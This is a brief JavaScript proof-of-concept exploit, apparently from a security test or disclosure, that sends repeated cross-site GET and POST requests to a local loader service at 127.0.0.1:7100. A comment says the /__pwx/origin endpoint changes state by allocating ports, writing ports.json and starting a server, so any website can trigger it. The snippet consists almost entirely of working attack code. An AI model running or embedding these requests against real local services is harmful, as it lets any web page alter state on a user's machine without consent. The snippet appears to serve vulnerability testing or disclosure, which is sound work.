// Exploit: cross-site requests to the local loader. /__pwx/origin is a GET that changes state
// (allocates a port, writes ports.json, starts a server), so any website can trigger it.
for (let i = 0; i < 20; i++) {
  fetch(`http://127.0.0.1:7100/__pwx/origin?id=attack.n${i}`, { mode: "no-cors" }).catch(() => {});
  fetch(`http://127.0.0.1:7100/__pwx/origin?id=attack.p${i}`, { mode: "no-cors", method: "POST" }).catch(() => {});
}
setTimeout(() => { document.body.dataset.done = "1"; }, 3000);
